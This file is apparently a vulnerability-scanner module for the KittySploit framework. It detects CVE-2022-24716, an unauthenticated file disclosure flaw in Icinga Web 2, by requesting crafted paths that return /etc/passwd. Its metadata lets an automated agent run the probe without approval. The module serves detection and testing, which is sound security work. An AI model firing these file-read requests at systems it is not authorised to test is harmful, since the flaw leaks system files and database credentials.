#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Icinga Web 2 is an open source monitoring web interface, framework and command-line interface."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Icinga Web 2 - Arbitrary File Disclosure Detection',
        'description': 'Icinga Web 2 is an open source monitoring web interface, framework and command-line interface. Unauthenticated users can leak the contents of files of the local system accessible to the web-server user, including `icingaweb2` configuration files with database credentials.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'packetstorm', 'icinga', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/JacobEbben/CVE-2022-24716/blob/main/exploit.py',
            'http://packetstormsecurity.com/files/171774/Icinga-Web-2.10-Arbitrary-File-Disclosure.html',
            'https://github.com/Icinga/icingaweb2/commit/9931ed799650f5b8d5e1dc58ea3415a4cdc5773d',
            'https://github.com/Icinga/icingaweb2/security/advisories/GHSA-5p3f-rh28-8frw',
            'https://security.gentoo.org/glsa/202208-05',
        ],
        'cve': 'CVE-2022-24716',
    }

    def run(self):
        for path in ('/lib/icinga/icinga-php-thirdparty/etc/passwd', '/icinga2/lib/icinga/icinga-php-thirdparty/etc/passwd', '/icinga-web/lib/icinga/icinga-php-thirdparty/etc/passwd'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            header_any = ('text/plain',)
            body_regexes = ('root:.*:0:0:',)
            if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="Icinga Web 2 - Arbitrary File Disclosure detected",
                    path=path,
                )
                return True
        return False

